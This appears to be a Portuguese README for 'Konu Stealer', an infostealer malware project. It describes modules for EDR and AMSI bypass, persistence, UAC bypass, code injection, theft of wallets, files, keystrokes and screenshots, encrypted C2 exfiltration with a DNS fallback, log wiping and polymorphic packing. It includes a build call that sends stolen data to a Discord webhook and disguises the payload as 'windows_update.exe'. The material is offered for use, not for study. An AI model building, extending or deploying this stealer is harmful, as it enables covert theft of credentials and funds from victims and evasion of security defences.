# Konu Stealer — Advanced Module Integration

## Módulos Adicionados

| Módulo | Função |
|--------|--------|
| `edr-bypass.js` | Evasão de EDR (AMSI, ETW, unhooking, sandbox detection) |
| `persistence.js` | Persistência (WMI, Scheduled Tasks, Registry, Services) |
| `advanced-collection.js` | Coleta expandida (wallets, arquivos, screenshots, keylog) |
| `secure-comms.js` | Comunicação segura (AES-256-GCM, beaconing, C2 fallback) |
| `polymorphic.js` | Polimorfismo (criptografia por blocos, mutação, dead code) |
| `cleanup.js` | Limpeza de rastros (logs, prefetch, registry, timestomp) |
| `privesc.js` | Escalada de privilégio (UAC bypass, token manipulation) |
| `injection.js` | Injeção de código (APC, DLL hollowing, thread hijacking) |
| `builder-enhanced.js` | Builder avançado (multi-stage, packing, signing) |
| `integration.js` | Integração com o código original |

## Como Usar

### Execução Direta
```bash
node integration.js
```

### Build Personalizado
```javascript
const { build } = require('./integration');

const result = await build({
  os: 'win32',
  arch: 'x64',
  webhook: 'https://discord.com/api/webhooks/...',
  filename: 'windows_update.exe',
  pack: true,
  sign: false,
  modules: ['edr-bypass', 'persistence', 'advanced-collection', 'secure-comms', 'cleanup']
});
```

## Arquitetura

```
integration.js (entry point)
  ├── edr-bypass.js (verificação sandbox + bypass AMSI/ETW)
  ├── privesc.js (UAC bypass se necessário)
  ├── persistence.js (instalação de persistência)
  ├── advanced-collection.js (coleta expandida)
  │     └── modules/ (coleta original do Konu)
  ├── secure-comms.js (exfil criptografado)
  ├── cleanup.js (limpeza de rastros)
  └── polymorphic.js (opcional - build único)
```

## Requisitos

- Node.js 18+
- Windows 10/11 (para módulos de evasão)
- Permissões padrão de usuário (privesc tenta elevar)
- npm packages: `ffi-napi`, `ref-napi`, `ref-struct-di` (opcional)

## Notas de Segurança

- Os módulos usam try/catch silencioso para evitar crashes
- Sleep obfuscation adiciona delays com cálculos pesados
- DNS exfil usado como fallback se HTTPS falhar
- Beaconing com jitter 30-300 segundos
- PFS (Perfect Forward Secrecy) via ECDH